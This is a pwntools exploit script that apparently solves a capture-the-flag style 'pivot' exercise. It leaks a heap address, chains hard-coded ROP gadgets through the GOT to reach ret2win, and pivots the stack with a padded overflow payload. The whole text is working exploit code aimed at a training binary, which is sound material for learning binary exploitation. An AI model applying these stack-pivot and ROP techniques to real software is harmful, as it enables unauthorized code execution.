from pwn import *
import time

elf = ELF('./pivot')
libc = ELF('libpivot.so')

io = process(elf.path)

data = io.recv()

for line in data.split(b'\n'):
    if b'0x' in line:
        pivot_int = int(line.strip().split(b'0x')[1], 16)
        break

offset = libc.symbols['ret2win'] - libc.symbols['foothold_function']
print(f"offset: {hex(offset)}")


foothold = p64(0x0000000000400720)
foothold_got_addr = elf.got['foothold_function']
foothold_got = p64(foothold_got_addr)
pop_rax_ret = p64(0x00000000004009bb)
mov_rax_qword_ptr = p64(0x00000000004009c0)
pop_rbp = p64(0x00000000004007c8)
add_rax_rbp = p64(0x00000000004009c4)
call_rax = p64(0x00000000004006b0)
xchg_rsp_rax_ret = p64(0x00000000004009bd)

rop_chain = b''
rop_chain += foothold
rop_chain += pop_rax_ret
rop_chain += foothold_got
rop_chain += mov_rax_qword_ptr
rop_chain += pop_rbp
rop_chain += p64(offset)
rop_chain += add_rax_rbp
rop_chain += call_rax


pivot_payload = b'A' * 32 + b'B' * 8
pivot_payload += pop_rax_ret
pivot_payload += p64(pivot_int)
pivot_payload += xchg_rsp_rax_ret

io.sendline(rop_chain)

io.recvuntil(b'> ')
io.sendline(pivot_payload)
io.interactive()